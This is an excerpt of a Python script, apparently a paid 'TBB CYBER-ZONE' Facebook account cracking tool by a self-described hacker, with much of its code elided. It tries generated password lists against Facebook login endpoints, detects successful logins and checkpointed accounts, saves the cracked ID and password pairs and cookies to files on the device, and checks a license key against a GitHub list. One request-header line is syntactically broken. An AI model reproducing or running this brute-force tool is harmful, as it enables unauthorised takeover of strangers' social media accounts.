#assalamowalikom OPEN source by Harry (TUSHAR SARKER )
...
import os,base64
os.system("xdg-open https://m.me/rafi.sarker.9085/?ref=share")
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/TBBCYBERZONE/PAID/blob/main/MUMT4Z.txt').text
		ua=open('.bbnew.txt','w')
...
\033[1;93m--------------------------------------------------
  \033[1;32mF4C3B00K  : Tushar
  \033[1;32mY0UTUB3   : HACKING BANGKA TUSHAR OFFICIAL
  \033[1;32mV3RS10N   : 10.10
  \033[1;32m0WN3R     : TUSHAR
--------------------------------------------------
...
def auto_file(cookies,access_token):
    ...
    print('\n \033[1;35m /sdcard/TBB CYBER-ZONE.txt \033[0;97m\n')
    ...
    print('\n')
    input(' Press enter to back ')
    os.system('python TBB CYBER-ZONE.py')
...
def manual_file(cookies,access_token):
    ...
    try:
        ...
        limit = 1
    print('\n \033[1;32mExample: /sdcard/TBB-CYBER-ZONE.txt \033[0;97m\n')
...
def sids():
    ...
    print('\n\033[1;32m Example: /sdcard/TBB-CYBER-ZONE.txt\033[0;97m')
...
def menu(): 
	...
	if xd in ['1','01']:
	   ...
	   gmail()
		...
		os.system(f'xdg-open https://www.facebook.com/groups/547086573624546/');menu()
...
def gmail():
		...
		clear()
		print('\033[1;32m example: Tushar, sarker, rafi, tushar, sarker\033[1;97m')
		linex()
		first = input(' Put first name: ')
		linex()
		print('\033[1;32m example: Tushar, Sarker, ceo \033[1;97m')
		linex()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\r\r\033[1;32m [TBB CYBER-ZONE] %s | %s'%(ids,pas))
				open('/sdcard/TBB CYBER-ZONE-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m [TBB CYBER-ZONE-CP] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/TBB CYBER-ZONE-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def rcrack1(ids,passlist):
	...
	try:
		for pas in passlist:
			...
			if 'session_key' in q:
				udx = str(q['uid'])
				print('\r\r\033[1;32m [TBB CYBER-ZONE-OK] '+udx+' | '+pas+'\033[1;97m')
				open('/sdcard/TBB CYBER-ZONE-OK.txt', 'a').write(udx+'|'+pas+'\n')
				oks.append(ids)
				break
...
def rcrack(ids,passlist):
	...
	try:
		for pas in passlist:
			...
			'method': 'POST',
			'scheme': 'https',
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',1
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						print('\r\r\033[1;34m [TBB CYBER-ZONE-TL] '+ids+' | '+pas)
					else:
						print(f'\r\x1b[1;32m [TBB CYBER-ZONE-OK] '+ids+' | '+pas)
						cek_apk(session,coki)
						open('/sdcard/TBB CYBER-ZONE.txt', 'a').write(ids+'|'+pas+'\n')
						oks.append(uid)
						break
...
def menu_apikey():
  ...
  id = "_".join(uuid)
  server = requests.get('https://github.com/TBBCYBERZONE.txt').text
  ...
  print("""\033[1;37m
    ...
    \033[1;38m  .##.....##.##.....##.##.......####
    \033[1;32m_______________________________________
\033[1;37m[-] AUTHOR    :\033[1;32m TUSHAR
\033[1;37m[-] GITHUB    :\033[1;32m TBB CYBER ZONE
\033[1;37m[-] WhatsApp  :\033[1;32m Md Tushar Sarker  
...
==================================================   """)
  ...
  os.system('xdg-open https://api.whatsapp.com/send?phone=+8801738135616&text=')
  print("");time.sleep(2)
  print("\x1b[1;97m  CHECKING YOUR APROVAL.............                                                ");time.sleep (0.5)
  try:
    httpCaht = requests.get("https://github.com/TBBCYBERZONE/Random_paid/blob/main/Approve.txt").text
    if id in httpCaht:
      ...
      os.system('xdg-open https://m.me/rafi.sarker.9085')
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
...
def tnx():
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "_".join(uuid)
  server = requests.get('https://github.com/TBBCYBERZONE/Random_paid/blob/main/Approve.txt').text
